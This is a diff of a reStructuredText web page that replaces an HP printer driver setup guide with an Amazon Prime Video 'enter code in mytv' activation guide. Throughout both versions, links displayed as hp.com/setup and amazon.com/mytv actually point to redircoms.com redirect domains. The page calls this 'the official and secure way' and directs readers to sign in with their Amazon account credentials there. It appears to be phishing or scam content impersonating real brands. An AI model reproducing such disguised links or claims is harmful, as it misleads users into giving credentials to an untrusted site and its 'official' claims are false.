@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+Steps to enter code in mytv to activate your device?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 98C899EEC245D9CBFD6A1AD132F06457
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: ENTER-ACTIVATION-CODE-BUTTON.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: amazon.com/mytv
+      :target: https://az.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,20 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+To stream your favorite content on Amazon Prime Video, you must activate your device first. Visit `amazon.com/mytv <https://az.redircoms.com>`_ to **enter code in mytv** and link your smart device with your Amazon account. This is the official and secure way to complete activation.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Follow These Quick Steps
+--------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+1. Turn on your smart TV or streaming device and open the Amazon Prime Video app.
+2. You’ll see a unique registration code displayed on the screen.
+3. Using a computer or mobile device, go to `amazon.com/mytv <https://az.redircoms.com>`_.
+4. Sign in with your Amazon account credentials.
+5. Enter the code displayed on your TV screen and click **Register**.
+6. Once verified, your device will be activated instantly and ready to stream.
 
-2. Enter your HP printer model in the search box.
+Conclusion
+-----------
 
-3. Select your operating system if prompted.
+It only takes a few moments to **enter code in mytv** and activate your device via `amazon.com/mytv <https://az.redircoms.com>`_. Make sure your internet connection is stable for a smooth activation experience.
 
-4. Click on **Download** to get the latest driver and software package.
-
-5. Save the installer file to your computer.
-
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
